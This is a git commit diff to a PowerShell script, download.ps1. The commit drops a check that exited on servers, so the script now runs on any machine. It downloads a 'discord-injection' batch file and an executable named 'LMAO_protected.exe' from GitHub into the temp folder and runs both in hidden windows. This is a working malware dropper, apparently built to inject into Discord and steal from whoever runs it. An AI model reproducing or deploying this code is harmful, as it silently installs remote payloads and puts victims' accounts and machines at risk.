420fda9cdf343486bb835a120e3ffae3bae14a91
43a1723 <hai1723notgay@gmail.com>
2024-06-11 12:51:42 +0700

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -42,16 +42,10 @@ Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEac
 }
 
 
-if ($computerSystem.DomainRole -eq 1 -or $computerSystem.DomainRole -eq 2) {
-    Write-Host "This is a server. Exiting..."
-    exit
-} else {
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/assets/hookinjection.bat" -OutFile "$temp\injection.cmd"
-    Start-Process -FilePath "$temp\injection.cmd" -WindowStyle Hidden
-    
-    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
-    Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
-}
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/assets/hookinjection.bat" -OutFile "$temp\injection.cmd"
+Start-Process -FilePath "$temp\injection.cmd" -WindowStyle Hidden
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
+Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
 
 
 
